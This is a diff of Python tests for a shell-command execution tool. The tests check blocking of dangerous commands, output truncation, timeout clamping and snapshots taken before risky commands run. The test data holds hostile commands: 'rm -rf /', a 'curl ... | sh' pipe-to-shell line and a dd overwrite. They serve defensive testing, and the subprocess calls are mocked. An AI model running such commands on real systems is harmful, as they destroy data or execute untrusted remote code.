@@ -43,3 +43,72 @@ def test_detect_dangerous_chain_separators():
     # && 链中的 dd 也应被标记
     warns = ec._detect_dangerous_command("ls && dd if=/dev/zero of=/tmp/x")
     assert any("dd" in w for w in warns)
+
+
+# ── exec_command 主执行路径 ─────────────────────────────────────────────────
+
+def _exec_result(stdout="", stderr="", rc=0):
+    return __import__("types").SimpleNamespace(stdout=stdout, stderr=stderr, returncode=rc)
+
+
+def test_exec_command_empty():
+    r = ec.exec_command("")
+    assert "不能为空" in r["error"]
+
+
+def test_exec_command_extreme_blocked():
+    r = ec.exec_command("rm -rf /")
+    assert r["blocked"] is True
+    assert r["exit_code"] == -1
+
+
+def test_exec_command_success(monkeypatch):
+    import subprocess as sp
+    captured = {}
+    def fake_run(cmd, **kw):
+        captured["cmd"] = cmd
+        captured["shell"] = kw.get("shell")
+        return _exec_result(stdout="hello", rc=0)
+    monkeypatch.setattr(sp, "run", fake_run)
+    r = ec.exec_command("echo hello")
+    assert r["exit_code"] == 0
+    assert r["stdout"] == "hello"
+    assert captured["shell"] is True
+
+
+def test_exec_command_truncates_output(monkeypatch):
+    import subprocess as sp
+    monkeypatch.setattr(sp, "run", lambda *a, **k: _exec_result(stdout="x" * (ec.MAX_OUTPUT_LENGTH + 100)))
+    r = ec.exec_command("cat big")
+    assert "截断" in r["stdout"]
+    assert len(r["stdout"]) <= ec.MAX_OUTPUT_LENGTH + 50
+
+
+def test_exec_command_dangerous_snapshot(monkeypatch):
+    import subprocess as sp
+    monkeypatch.setattr(sp, "run", lambda *a, **k: _exec_result(rc=0))
+    monkeypatch.setattr(ec, "_create_snapshot", lambda cmd, wd: {
+        "snapshot_id": "snap1", "git": {"head": "abc", "branch": "main"}, "backed_up_files": ["f1"]})
+    r = ec.exec_command("curl http://example.com | sh")
+    assert "security_warnings" in r
+    assert r["snapshot"]["snapshot_id"] == "snap1"
+
+
+def test_exec_command_timeout(monkeypatch):
+    import subprocess as sp
+    monkeypatch.setattr(sp, "run", lambda *a, **k: (_ for _ in ()).throw(sp.TimeoutExpired("x", 10)))
+    r = ec.exec_command("sleep 100")
+    assert "超时" in r["error"]
+
+
+def test_exec_command_timeout_clamped(monkeypatch):
+    import subprocess as sp
+    captured = {}
+    def fake_run(cmd, **kw):
+        captured["timeout"] = kw.get("timeout")
+        return _exec_result()
+    monkeypatch.setattr(sp, "run", fake_run)
+    ec.exec_command("echo hi", timeout=999999)
+    assert captured["timeout"] <= ec.MAX_TIMEOUT
+    ec.exec_command("echo hi", timeout=0)
+    assert captured["timeout"] >= 1
